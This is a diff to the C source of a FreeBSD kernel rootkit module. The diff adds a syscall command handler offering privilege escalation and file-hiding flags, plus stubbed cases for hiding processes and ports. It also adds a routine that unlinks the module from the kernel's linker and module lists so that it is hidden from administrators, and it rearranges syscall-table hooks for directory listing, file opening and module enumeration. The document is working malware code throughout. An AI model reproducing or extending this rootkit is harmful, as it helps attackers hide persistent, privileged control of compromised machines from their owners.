@@ -8,11 +8,17 @@ struct rootkit_args {
 	char ** args;
 };
 
+static int mod_unlink(struct module *module, int cmd, void *arg);
+static int mod_load(struct module *module, int cmd, void *arg);
+static int mod_unload(struct module *module, int cmd, void *arg);
+
+/* The offset in sysent[] where the system call is to be allocated. */
+static int offset = NO_SYSCALL;
+
 static int testfd = 0;
 //Following fd functions taken from https://lists.freebsd.org/pipermail/freebsd-hackers/2007-May/020625.html
 
-static int
-filewriter_closelog(struct thread *td, int fd)
+static int filewriter_closelog(struct thread *td, int fd)
 {
   printf("filewriter_closelog fd: %d\n", fd);
   if(fd)
@@ -25,8 +31,7 @@ filewriter_closelog(struct thread *td, int fd)
   return 0;
 }
 
-static int
-filewriter_openlog(struct thread *td, int *fd, char *path)
+static int filewriter_openlog(struct thread *td, int *fd, char *path)
 {
   int error;
   error = kern_openat(td, AT_FDCWD, path, UIO_SYSSPACE, O_WRONLY | O_CREAT | O_APPEND, 0644);
@@ -40,8 +45,7 @@ filewriter_openlog(struct thread *td, int *fd, char *path)
   return error;
 }
 
-static int
-filewriter_writelog(struct thread *td, int fd, char *line, u_int len)
+static int filewriter_writelog(struct thread *td, int fd, char *line, u_int len)
 {
   struct uio auio;
   struct iovec aiov;
@@ -85,19 +89,27 @@ static int main(struct thread *td, void *syscall_args) {
 		case 1:// Escalate
 			elevate(td);
 			break;
-		case 2:// File hide
+		case 2:// Add file to tracker
 			add_file(uap->args[0]);
 			break;
-		case 3:
+		case 3:// Remove file from tracker
 			remove_file(uap->args[0]);
 			break;
-		case 4:
+		case 4:// Set tracker flags
 			resp = strtol(uap->args[1], NULL, 16);
 			set_flag_bits(uap->args[0], (uint8_t)resp);
 			break;
-		case 5:
+		case 5:// Unset tracker flags
 			resp = strtol(uap->args[1], NULL, 16);
 			unset_flag_bits(uap->args[0], (uint8_t)resp);
+			break;
+		case 6://Hide process
+			break;
+		case 7://Unhide process
+			break;
+		case 8://Hide port
+			break;
+		case 9://Unhide port
 			break;
 		default:
 			break;
@@ -112,8 +124,77 @@ static struct sysent rootkit_sysent = {
 	main		/* implementing function */
 };
 
-/* The offset in sysent[] where the system call is to be allocated. */
-static int offset = NO_SYSCALL;
+static int mod_unlink(struct module *module, int cmd, void *arg)
+{
+	struct linker_file *lf;
+	struct module *mod;
+
+	sx_xlock(&kld_sx);
+
+	/* Decrement the current kernel image's reference count. */
+	(&linker_files)->tqh_first->refs--;
+
+	/*
+	 * Iterate through the linker_files list, looking for LINKER_FILE.
+	 * If found, decrement next_file_id and remove from list.
+	 */
+	TAILQ_FOREACH(lf, &linker_files, link) {
+		if (strcmp(lf->filename, LINKER_FILE) == 0) {
+			next_file_id--;
+			TAILQ_REMOVE(&linker_files, lf, link);
+			break;
+		}
+	}
+
+	sx_xunlock(&kld_sx);
+
+	sx_xlock(&modules_sx);
+
+	/*
+	 * Iterate through the modules list, looking for "incognito."
+	 * If found, decrement nextid and remove from list.
+	 */
+	TAILQ_FOREACH(mod, &modules, link) {
+		if (strcmp(mod->name, MODULE_NAME) == 0) {
+			nextid--;
+			TAILQ_REMOVE(&modules, mod, link);
+			break;
+		}
+	}
+
+	sx_xunlock(&modules_sx);
+
+	return 0;
+}
+
+static int mod_load(struct module *module, int cmd, void *arg)
+{
+	// sysent[SYS_kldnext].sy_call = (sy_call_t *)hook_sys_kldnext;
+	// sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
+	// sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
+	// sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
+
+	char buf[256] = {0};
+	snprintf(buf,256,"%d",offset);
+
+	filewriter_openlog(curthread, &testfd, "useful.txt");
+	filewriter_writelog(curthread, testfd, buf, strlen(buf));
+	filewriter_closelog(curthread, testfd);
+
+	mod_unlink(module, cmd, arg);
+
+	return 0;
+}
+
+static int mod_unload(struct module *module, int cmd, void *arg)
+{
+	// sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
+	// sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
+	// sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
+	// sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
+
+	return 0;
+}
 
 /* The function called at load/unload. */
 static int load(struct module *module, int cmd, void *arg) {
@@ -121,32 +202,11 @@ static int load(struct module *module, int cmd, void *arg) {
 
 	switch (cmd) {
 	case MOD_LOAD:
-		sysent[SYS_kldnext].sy_call = (sy_call_t *)hook_sys_kldnext;
-		sysent[SYS_getdirentries].sy_call = (sy_call_t *)hook_sys_getdirentries;
-		sysent[SYS_open].sy_call = (sy_call_t *)hook_sys_open;
-		sysent[SYS_openat].sy_call = (sy_call_t *)hook_sys_openat;
-		sysent[SYS_execve].sy_call = (sy_call_t *)hook_sys_execve;
-		// sysent[SYS_read].sy_call = (sy_call_t *)hook_sys_read;
-		// sysent[SYS_write].sy_call = (sy_call_t *)hook_sys_write;
-
-		char buf[256] = {0};
-		snprintf(buf,256,"%d",offset);
-
-		filewriter_openlog(curthread, &testfd, "useful.txt");
-		filewriter_writelog(curthread, testfd, buf, strlen(buf));
-		filewriter_closelog(curthread, testfd);
-
+		error = mod_load(module, cmd, arg);
 		break;
 
 	case MOD_UNLOAD:
-		sysent[SYS_kldnext].sy_call = (sy_call_t *)sys_kldnext;
-		sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
-		sysent[SYS_open].sy_call = (sy_call_t *)sys_open;
-		sysent[SYS_openat].sy_call = (sy_call_t *)sys_openat;
-		sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
-		// sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
-		// sysent[SYS_write].sy_call = (sy_call_t *)sys_write;
-
+		error = mod_unload(module, cmd, arg);
 		break;
 
 	default:
